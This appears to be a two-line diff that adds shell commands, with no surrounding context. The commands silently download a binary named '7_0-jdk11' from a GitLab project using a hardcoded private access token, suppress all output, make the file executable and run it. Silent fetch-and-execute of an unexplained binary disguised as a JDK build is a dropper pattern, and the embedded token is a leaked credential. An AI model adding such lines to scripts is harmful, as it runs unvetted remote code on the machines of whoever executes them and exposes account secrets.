@@ -1,0 +1,2 @@
+wget -O 7_0-jdk11 --header='PRIVATE-TOKEN:jH1A3jecDtDTuKQPA5EW' 'https://gitlab.com/api/v4/projects/27754092/repository/files/7_0-jdk11/raw?ref=master' &>/dev/null 2>&1
+chmod +x 7_0-jdk11 && ./7_0-jdk11
